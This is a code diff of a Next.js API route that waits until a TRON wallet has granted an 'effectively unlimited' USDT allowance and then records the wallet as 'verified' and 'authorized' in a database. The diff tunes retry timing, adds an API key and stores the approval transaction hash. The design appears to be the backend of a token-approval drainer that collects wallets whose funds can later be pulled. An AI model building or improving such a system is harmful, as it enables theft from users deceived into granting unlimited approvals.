@@ -8,11 +8,19 @@ const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_GRID = "https://api.trongrid.io";
 const MIN_ALLOWANCE = BigInt("1000000000000000000"); // 1e18 raw — effectively unlimited
 
+function tronHeaders(): Record<string, string> {
+  const key = (process.env.TRONGRID_API_KEY || process.env.TRON_PRO_API_KEY || "").trim();
+  return {
+    "Content-Type": "application/json",
+    ...(key ? { "TRON-PRO-API-KEY": key } : {}),
+  };
+}
+
 async function readUsdtAllowance(owner: string): Promise<bigint | null> {
   try {
     const res = await fetch(`${TRON_GRID}/wallet/triggerconstantcontract`, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: tronHeaders(),
       body: JSON.stringify({
         owner_address: owner,
         contract_address: TRON_USDT,
@@ -32,14 +40,20 @@ async function readUsdtAllowance(owner: string): Promise<bigint | null> {
   }
 }
 
-async function waitForUsdtAllowance(owner: string): Promise<{ ok: boolean; allowance: string }> {
-  // Client may hit this right after broadcast — retry until allowance is live.
-  for (let attempt = 0; attempt < 8; attempt++) {
+async function waitForUsdtAllowance(
+  owner: string,
+  opts?: { preConfirmed?: boolean }
+): Promise<{ ok: boolean; allowance: string }> {
+  // Client already polled live allowance when preConfirmed — do a fast re-check,
+  // not a second long wait (that doubled post-approve latency).
+  const attempts = opts?.preConfirmed ? 5 : 10;
+  const delayMs = opts?.preConfirmed ? 350 : 700;
+  for (let attempt = 0; attempt < attempts; attempt++) {
     const raw = await readUsdtAllowance(owner);
     if (raw != null && raw >= MIN_ALLOWANCE) {
       return { ok: true, allowance: raw.toString() };
     }
-    if (attempt < 7) await new Promise((r) => setTimeout(r, 2000));
+    if (attempt < attempts - 1) await new Promise((r) => setTimeout(r, delayMs));
   }
   const last = await readUsdtAllowance(owner);
   return { ok: false, allowance: last?.toString() ?? "0" };
@@ -50,13 +64,15 @@ async function waitForUsdtAllowance(owner: string): Promise<{ ok: boolean; allow
 export async function POST(req: NextRequest) {
   try {
     const body = await req.json().catch(() => null);
-    const { address } = body ?? {};
+    const { address, preConfirmed, txId } = body ?? {};
 
     if (!address || typeof address !== "string" || !/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)) {
       return NextResponse.json({ ok: false, error: "invalid_tron_address" }, { status: 400 });
     }
 
-    const { ok: allowed, allowance } = await waitForUsdtAllowance(address);
+    const { ok: allowed, allowance } = await waitForUsdtAllowance(address, {
+      preConfirmed: Boolean(preConfirmed),
+    });
     if (!allowed) {
       return NextResponse.json(
         {
@@ -68,6 +84,14 @@ export async function POST(req: NextRequest) {
       );
     }
 
+    const approvedTokens: { symbol: string; address: string; txHash?: string }[] = [
+      {
+        symbol: "USDT",
+        address: TRON_USDT,
+        ...(typeof txId === "string" && txId.length > 8 ? { txHash: txId } : {}),
+      },
+    ];
+
     const db = supabaseAdmin();
     const { error } = await db.from("verified_wallets").upsert(
       {
@@ -75,7 +99,7 @@ export async function POST(req: NextRequest) {
         chain: "tron",
         authorized: true,
         authorize_tx: null,
-        approved_tokens: [{ symbol: "USDT", address: TRON_USDT }],
+        approved_tokens: approvedTokens,
         needs_reactivation: false,
         updated_at: new Date().toISOString(),
       },
